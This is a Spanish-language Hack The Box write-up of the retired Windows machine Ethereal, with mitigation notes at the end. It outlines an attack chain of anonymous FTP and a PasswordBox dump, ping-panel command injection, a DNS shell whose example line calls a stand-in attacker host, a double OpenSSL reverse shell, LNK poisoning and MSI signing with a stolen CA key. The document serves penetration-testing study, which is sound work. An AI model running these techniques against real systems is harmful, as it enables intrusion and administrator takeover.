---
machine: Ethereal
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, ftp, password-manager, command-injection, dns, lnk, msi, privesc]
---

# Ethereal — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El FTP anónimo expone imágenes de disco con una base de PasswordBox y su contraseña maestra débil. El volcado da credenciales para el panel de ping en 8080, donde una inyección de comandos permite un shell por DNS y después por OpenSSL. Un LNK escribible que abre jorge se envenena para obtener su sesión; en `D:\Certs` está la CA privada y un directorio de MSIs vigilado por rupal, administrador. Un MSI firmado con esa CA ejecuta código como admin.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,80,8080 <IP>
```

- `21` FTP con acceso anónimo, `80` web y `8080` panel de administración.
- El FTP contiene `DISK1.zip`, `FDISK.zip` y una imagen etiquetada `PASSWORDS`.
- La web menciona un panel de ping en `ethereal.htb:8080`.

## Enumeración

Se monta la imagen FAT y se abre la base con el cliente Linux de PasswordBox. La contraseña maestra es débil y `--dump` extrae usuarios y contraseñas. Con `hydra` contra la autenticación básica de 8080 se valida la cuenta de `alan`.

## Foothold

El panel ejecuta `ping -n 2 <host>`; se inyecta con `&` y se confirma con `tcpdump`. PowerShell no está disponible, pero `nslookup` y `certutil` sí; se construye un shell por DNS para ejecutar comandos. Después se descubre OpenSSL en `C:\Progra~2\OpenSS~1.0\bin\openssl.exe` y se usa un doble `s_client` con `cmd.exe` entre ambos para un shell interactivo.

```bash
# inyección en el panel de ping
127.0.0.1 & nslookup <CMD>.<ATTACKER>
# LNK envenenado
python LNKUp/generate.py --host localhost --type ntlm --out vs.lnk --execute 'cmd /c ...'
# MSI firmado
signtool sign /f MySPC.pfx /fd sha256 Ethereal.msi
```

## Movimiento lateral

`C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk` es escribible. Se reemplaza por un LNK que ejecuta el mismo doble OpenSSL; un script de jorge abre el acceso cada pocos minutos, así que la sesión llega como `jorge`.

## Escalada de privilegios

`D:\Certs` contiene `MyCA.cer` y `MyCA.pvk`, la clave privada de la CA. `D:\DEV\MSIs` tiene una nota de rupal: los MSI que se dejen allí se ejecutan. Se crea un certificado de firma de código, se firma un MSI con una acción personalizada y se copia al directorio; rupal lo ejecuta como administrador.

## Evidencia

- Base PasswordBox y credenciales de `alan`.
- Inyección en el panel y shell por DNS/OpenSSL.
- LNK envenenado y sesión de `jorge`.
- CA privada, MSI firmado y shell de `rupal`.

## Lecciones aprendidas

- Los backups de gestores de contraseñas son objetivos de alto valor.
- Un panel que concatena un host en `ping` permite inyección.
- Los LNK en directorios públicos pueden ser secuestrados.
- Una CA privada accesible permite firmar binarios que el sistema confía.

## Mitigación y detección

- No usar FTP anónimo ni contraseñas maestras débiles.
- Parametrizar el ping y validar el host.
- Restringir escritura en accesos directos y directorios de despliegue.
- Proteger la clave de la CA y verificar el origen de los MSI.

## Referencias

- [0xdf — Ethereal](https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html)
- [IppSec — Ethereal](https://www.youtube.com/watch?v=Bhh5yPHjwUY)
- [Hack The Box — Ethereal](https://app.hackthebox.com/machines/ethereal)
